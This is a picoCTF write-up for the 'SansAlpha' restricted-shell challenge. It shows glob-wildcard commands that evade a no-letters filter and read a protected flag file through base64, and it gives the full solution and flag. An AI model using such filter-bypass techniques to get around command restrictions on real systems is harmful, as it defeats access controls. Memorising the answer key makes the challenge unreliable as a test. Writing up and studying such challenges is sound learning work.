# SansAlpha
Challenge Description:
> The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.

CTF: <b>picoCTF</b> (picoGym)<br>Difficulty: <b>Medium</b>

<b>[Jump to solution](#solution)</b>

## Hints
Here are the hints provided by the challenge author.
<details>
<summary>Hint 1</summary>

> Where can you get some letters?
</details>

## Procedure
The target we connect to gives us a shell, but rejects any command containing any letters. "Most" symbols and numbers, however, are allowed in our commands.
```
SansAlpha$ ls -a
SansAlpha: Unknown character detected
SansAlpha$ ./
bash: ./: Is a directory
```
Through a feature of bash known as <b>globbing</b>, we can probe around our environment using wildcards.
```
SansAlpha$ ./?
bash: ./?: No such file or directory

SansAlpha$ ./??
bash: ./??: No such file or directory

SansAlpha$ ./????
bash: ./????: No such file or directory

SansAlpha$ ./??????
bash: ./blargh: Is a directory

SansAlpha$ /???
bash: /bin: Is a directory

SansAlpha$ ./??????/*
bash: ./blargh/flag.txt: Permission denied
```
Unfortunately it doesn't look like we can run commands to read the flag in a conventional way. We need to figure out how to print the contents of the flag with the current restrictions.
```
SansAlpha$ ?
bash: ?: command not found

SansAlpha$ ??
bash: ??: command not found

SansAlpha$ ???
bash: ???: command not found

SansAlpha$ *
bash: blargh: command not found
```
After searching my local machine's `/bin` directory for commands that could possibly print the contents of flag (since basic commands like `cat` can't be accessed due to other 3-letter commands taking wildcard precedence), I found `base64`. There are plenty of other 6-letter commands, but `base64` is unique in that it has numbers in its name, allowing us to get specific about it.
```
SansAlpha$ /???/????64 ./??????/????.???
/bin/base64: extra operand '/bin/x86_64'
Try '/bin/base64 --help' for more information.
```
Coincidentally another 6-letter command has `64` at the end of its name, but we can use the `YY[!X]YYYY` globbing syntax to exclude any results with `X` as the third character (for example). Here, we can exclude results that have the number `8` as the second character.
```
SansAlpha$ /???/?[!8]??64 ./??????/????.???
aGFtbXl7dSB3aW4gLSBoYW1teX0=
```
We can then decode the base 64 output to get the flag.
```
$ echo "aGFtbXl7dSB3aW4gLSBoYW1teX0=" | base64 -d
hammy{u win - hammy}
```

## Solution
1. Run this command in the home directory to print the base 64 encoding of the flag:
    - `/???/?[!8]??64 ./??????/????.???`
2. Decode the base 64 output.

## Key Takeaways
Shell escape challenges are always a fun learning experience. Even if you have no clue where to begin (like I did for this one), you can read the first bits of a writeup, come to your own conclusions, and still come out feeling like you learned a lot and didn't cheat